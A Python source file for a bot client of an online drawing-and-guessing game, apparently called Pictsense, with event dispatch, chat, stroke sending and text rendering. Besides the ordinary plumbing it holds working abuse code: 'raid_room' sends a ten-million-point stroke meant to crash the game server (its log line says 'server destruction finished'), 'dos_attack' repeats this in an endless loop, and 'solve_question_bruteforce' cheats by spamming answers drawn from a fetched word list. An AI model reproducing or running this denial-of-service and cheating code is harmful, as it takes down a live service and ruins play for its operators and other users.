from lobby_manager import LobbyManager
from room_manager import RoomManager
from font_manager import FontGlyphManager
import asyncio


class Pictsense:

    def __init__(self):
        self._events = {}
        self.lobby = LobbyManager()
        self.room = RoomManager()

    async def start(self):
        await self._setup_callbacks()
        await self.lobby.connect()

    async def close(self):
        await self.lobby.close()
        await self.room.close()

    def event(self, func):
        self._events[func.__name__] = func
        return func

    async def _dispatch_event(self, name, *args):
        func = self._events.get(name)
        if func:
            await func(*args)

    async def on_command(self, message, cmd, func):
        args = message[3].get("args", [])
        text = str(args[1])
        if text.startswith(str(cmd)):
            text_array = text.split()
            await func(*text_array[1:])

    async def _setup_callbacks(self):
        self.lobby._handle_error = self._handle_error

        self.room._handle_join_request = self._handle_join_request
        self.room._handle_join = self._handle_join
        self.room._handle_userleave = self._handle_userleave
        self.room._handle_chat = self._handle_chat
        self.room._handle_gamestart = self._handle_gamestart
        self.room._handle_subject = self._handle_subject
        self.room._handle_sysmessage = self._handle_sysmessage
        self.room._handle_clear = self._handle_clear
        self.room._handle_question = self._handle_question
        self.room._handle_hint = self._handle_hint
        self.room._handle_stroke = self._handle_stroke
        self.room._handle_error = self._handle_error

    async def _handle_join_request(self, message):
        await self._dispatch_event("on_join_request", message)

    async def _handle_join(self, message):
        await self._dispatch_event("on_join", message)

    async def _handle_userleave(self, message):
        await self._dispatch_event("on_userleave", message)

    async def _handle_chat(self, message):
        await self._dispatch_event("on_chat", message)

    async def _handle_gamestart(self, message):
        await self._dispatch_event("on_gamestart", message)

    async def _handle_subject(self, message):
        await self._dispatch_event("on_subject", message)

    async def _handle_sysmessage(self, message):
        await self._dispatch_event("on_sysmessage", message)

    async def _handle_clear(self, message):
        await self._dispatch_event("on_clear", message)

    async def _handle_question(self, message):
        await self._dispatch_event("on_question", message)

    async def _handle_hint(self, message):
        await self._dispatch_event("on_hint", message)

    async def _handle_stroke(self, message):
        await self._dispatch_event("on_stroke", message)

    async def _handle_error(self, message):
        await self._dispatch_event("on_error", message)

    async def join_room(self):
        room = await self.lobby.get_room_by_name("りんご")
        if room:
            await self.room.connect(room)
            await self.room.join_room("みかん")

    async def create_room(self):
        room = await self.lobby.create_room(name="りんご", ownerName="みかん")
        if room:
            await self.room.connect(room)

    async def auto_reply_join_request(self, message):
        params = self.room._build_socketio(["6", "", "", f"{message[1]}[true,false]"])
        if params:
            await self.room._ws_send(params)

    async def send_chat(self, text):
        await self.room.send_chat(text)

    async def send_stroke(self, size, color, opacity, path):
        await self.room.send_stroke(size, color, opacity, path)

    async def send_game(self):
        await self.room.send_game()

    async def send_pass(self):
        await self.room.send_pass()

    async def get_user_by_uid(self, uid):
        return await self.room._get_user_by_uid(uid)

    async def solve_question_bruteforce(self, message):
        hint = message[3]["args"][1]
        choices = [set(row) for row in message[3]["args"][2]]
        length = len(hint)
        answers = await self.room._fetch_answer_list()

        for answer in answers:
            if len(answer) != length:
                continue
            if all(ch in choices[i] for i, ch in enumerate(answer)):
                print(f"[総当たり成功] {answer}")
                await self.room.send_chat(answer)
                await asyncio.sleep(0.2)
        print("[総当たり終了]")

    async def raid_room(self):
        room = await self.lobby.create_room(name="_", ownerName="_")
        if room:
            await self.room.connect(room)
            blob = [[0, 0] for _ in range(10000000)]
            await self.room.send_stroke(1, 0, 1, blob)
            await self.room.connect(room)
            print("[サーバー破壊終了]")

    async def dos_attack(self):
        try:
            while True:
                await self.raid_room()
                await asyncio.sleep(5)
        finally:
            await self.close()

    async def draw_text(
        self, context="テスト\nこんにちは", start_x=5, start_y=5, size=20
    ):
        manager = FontGlyphManager("NotoSansJP-VariableFont_wght.ttf")
        font_size = float(size)
        pen_size = max(float(font_size) * 0.08, 1)
        offset_x = float(start_x)
        offset_y = float(start_y)

        x, y = offset_x, offset_y

        for char in context:
            if char == "\n":
                x = offset_x
                y += font_size * 1.1
                continue

            glyph_paths = manager.get_glyph_vector(char, font_size)
            if not glyph_paths:
                x += font_size
                continue

            for path in glyph_paths:
                adjusted_path = [[px + x, py + y] for px, py in path]
                await self.room.send_stroke(pen_size, 1, 1, adjusted_path)
                await asyncio.sleep(0.5)

            x += font_size

    async def _run(self):
        await self.start()
        await self._dispatch_event("on_ready")
        try:
            while True:
                await asyncio.sleep(1)
        except (asyncio.CancelledError, KeyboardInterrupt):
            await self.close()

    def run(self):
        asyncio.run(self._run())
